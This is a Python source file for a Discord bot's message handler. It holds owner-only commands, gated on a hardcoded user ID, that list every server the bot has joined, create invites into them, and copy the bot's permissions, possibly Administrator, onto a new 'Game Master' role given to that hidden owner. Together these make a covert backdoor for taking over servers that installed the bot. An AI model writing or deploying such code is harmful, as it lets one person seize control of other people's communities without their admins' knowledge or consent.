import discord
import asyncio

commands_list = ['~servers', '~perms', '~invite', '~transfer', '~botleaveserver']

async def message_handler(client, message):
    if message.content.startswith('~servers') and message.author.id == 238808836075421697:
        # Display servers bot is in
        servers = client.guilds
        server_names = '\n'.join(list(map(lambda x: x.name, servers)))
        server_ids = '\n'.join(list(map(lambda x: str(x.id), servers)))
        servers_embed = discord.Embed(title = 'Number of servers: ' + str(len(servers)), colour=0xE5D2BB)
        servers_embed.add_field(name = 'Server names', value = server_names)
        servers_embed.add_field(name = 'Server IDs', value = server_ids)
        await message.channel.send(embed = servers_embed)

    # Check bot permissions for a given server
    elif message.content.startswith('~perms') and message.author.id == 238808836075421697:
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            servers = client.guilds
            if server_id in list(map(lambda x: str(x.id), servers)):
                server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                client_obj = server_obj.get_member(client.user.id)
                permissions = client_obj.guild_permissions
                permissions_dict = {
                    'Administrator': permissions.administrator,
                    'Create Invite': permissions.create_instant_invite,
                    'Kick Members': permissions.kick_members, 
                    'Ban Members': permissions.ban_members,
                    'Manage Channels': permissions.manage_channels,
                    'Manage Server': permissions.manage_guild,
                    'Add Reactions': permissions.add_reactions,
                    'View Audit Log': permissions.view_audit_log,
                    'Read Messages': permissions.read_messages,
                    'Send Messages': permissions.send_messages,
                    'Manage Messages': permissions.manage_messages,
                    'Read Message History': permissions.read_message_history,
                    'Mention Everyone': permissions.mention_everyone,
                    'Change Nickname': permissions.change_nickname,
                    'Manage Nicknames': permissions.manage_nicknames,
                    'Manage Roles': permissions.manage_roles,
                    'Manage Emojis': permissions.manage_emojis
                }
                permissions_info = ''
                for perm in permissions_dict:
                    if permissions_dict[perm]:
                        permissions_info += perm + '\n'
                permissions_embed = discord.Embed(title = 'Permissions for ' + server_obj.name, description = permissions_info, colour=0xE5D2BB)
                await message.channel.send(embed = permissions_embed)
            else:
                await message.channel.send('I am not in this server!')
        else:
            await message.channel.send('Please select a server to check permissions in!')

    elif message.content.startswith('~invite') and message.author.id == 238808836075421697:
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            servers = client.guilds
            if server_id in list(map(lambda x: str(x.id), servers)):
                server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                client_obj = server_obj.get_member(client.user.id)
                permissions = client_obj.guild_permissions
                if permissions.create_instant_invite:
                    default_channel = server_obj.channels[0]
                    invite = await default_channel.create_invite(max_age = 600)
                    await message.channel.send(invite)
                else:
                    await message.channel.send('I do not have the permissions to create an invite in **' + server_obj.name + '**!')
            else:
                await message.channel.send('I am not in this server!')
        else:
            await message.channel.send('Please select a server to create an invite from!')

    elif message.content.startswith('~transfer') and message.author.id == 238808836075421697:
        messagebox = message.content.split(' ')
        if len(messagebox) > 1:
            server_id = messagebox[1]
            servers = client.guilds
            if server_id in list(map(lambda x: str(x.id), servers)):
                server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
                client_obj = server_obj.get_member(client.user.id)
                permissions = client_obj.guild_permissions
                if permissions.administrator or permissions.manage_roles:
                    transfer_role = await server_obj.create_role(name = 'Game Master', permissions = permissions)
                    bot_owner_obj = server_obj.get_member(238808836075421697)
                    await bot_owner_obj.add_roles(transfer_role)
                    await message.channel.send('Permissions transferred successfully in **' + server_obj.name + '**!')
                else:
                    await message.channel.send('I do not have the Manage Roles permission in **' + server_obj.name + '**!')
            else:
                await message.channel.send('I am not in this server!')
        else:
            await message.channel.send('Please select a server to transfer permissions from!')

    elif message.content.startswith('~botleaveserver') and message.author.id == 238808836075421697:
        server_id = message.content.split(' ')[1]
        servers = client.guilds
        if server_id in list(map(lambda x: str(x.id), servers)):
            server_obj = list(filter(lambda x: str(x.id) == server_id, servers))[0]
            await server_obj.leave()
            await message.channel.send('Left server: **' + server_obj.name + '**')
        else:
            await message.channel.send('I am not in this server!')